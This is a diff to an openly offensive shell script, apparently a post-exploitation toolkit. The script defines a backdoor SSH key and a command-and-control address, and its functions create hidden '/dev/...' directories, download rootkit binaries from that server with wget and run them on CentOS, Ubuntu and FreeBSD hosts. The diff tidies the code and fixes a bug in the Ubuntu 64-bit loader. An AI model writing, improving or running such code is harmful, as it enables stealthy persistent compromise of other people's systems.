@@ -34,8 +34,12 @@
 #backdoor key
 SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKcAi3VkTNZOQsLiiPvE8gyThrLzD2w8g1aN4VArx8ksOfVteVRfDtjWVLgLpdbySjaIBXn4WeViqxf1TZ8fq5loN4tcHnFOvtBs30JQ1JktwXqwvZaHomqZGJeP0IHLK9rYsJZnHbyk4u2qgs/vpM3wkhX86ywpDzTo+xTEV+XPuCBP+e7QIDuBM20rXkHEroIssYDjSus9o3issH/u+iguGulJaW534mZ9YiC6ELoDKLpQ0wCgwEjLfg04Tz6L6mKBjkyq86wb5iDo0+5zrY5XKOJB5BiBsvAULBnA3to203ZaGrJWQP1CdPbpOINHkTekoWJt5W40LSD41pE86z"
 
+### CHANGE ME ###
+
 C2_URL="http://172.25.58.142/"
 C2_IP="172.25.58.142"
+
+#################
 
 #fedora kit
 FEDORA_KIT="fedx32.bin"
@@ -109,26 +113,25 @@ function do_bsdbackdoors() {
 
 
 function do_centos_rootkit() {
-    echo "Retrieving CentOS x86 kit..."
-    mkdir /dev/... 
-    cd /dev/...
-    wget -q $C2_URL$CENTOS_KIT
-    chmod +x `basename $CENTOS_KIT`
-    ./`basename $CENTOS_KIT`
+	echo "Retrieving CentOS x86 kit..."
+	mkdir /dev/... 
+	cd /dev/...
+	wget -q $C2_URL$CENTOS_KIT
+	chmod +x `basename $CENTOS_KIT`
+	./`basename $CENTOS_KIT`
 }
 
 function do_centos64_rootkit() {
-echo "Retrieving CentOS x64 kit..."
-mkdir /dev/...
-cd /dev/...
-wget -q $C2_URL$CENTOS64_KIT
-chmod +x `basename $CENTOS_KIT`
-./`basename $CENTOS_KIT`
+	echo "Retrieving CentOS x64 kit..."
+	mkdir /dev/...
+	cd /dev/...
+	wget -q $C2_URL$CENTOS64_KIT
+	chmod +x `basename $CENTOS_KIT`
+	./`basename $CENTOS_KIT`
 }
 
 
 function do_freebsd64_rootkit() {
-     
     cd /opt/
     wget -q $C2_URL$BSD_KIT
     chmod 0755 `basename $BSD_KIT`
@@ -137,13 +140,12 @@ function do_freebsd64_rootkit() {
 }
 
 function do_ubuntu_rootkit() {
-echo "Retrieving ubuntu x86 kit..."
-mkdir /dev/...
-cd /dev/...
-wget -q $C2_URL$UBUNTU_KIT
-chmod +x `basename $UBUNTU_KIT`
-./`basename $UBUNTU_KIT`
-
+	echo "Retrieving ubuntu x86 kit..."
+	mkdir /dev/...
+	cd /dev/...
+	wget -q $C2_URL$UBUNTU_KIT
+	chmod +x `basename $UBUNTU_KIT`
+	./`basename $UBUNTU_KIT`
 }
 
 
@@ -152,9 +154,8 @@ echo "Retrieving ubuntu x64 kit..."
     mkdir /dev/... 
     cd /dev/...
     wget -q $C2_URL$UBUNTU64_KIT
-    chmod +x `basename $UBUNTU_KIT`
-    ./`basename $UBUNTU_KIT`
-         
+    chmod +x `basename $UBUNTU64_KIT`
+    ./`basename $UBUNTU64_KIT`
 }
 
 function goodbye_sla() {
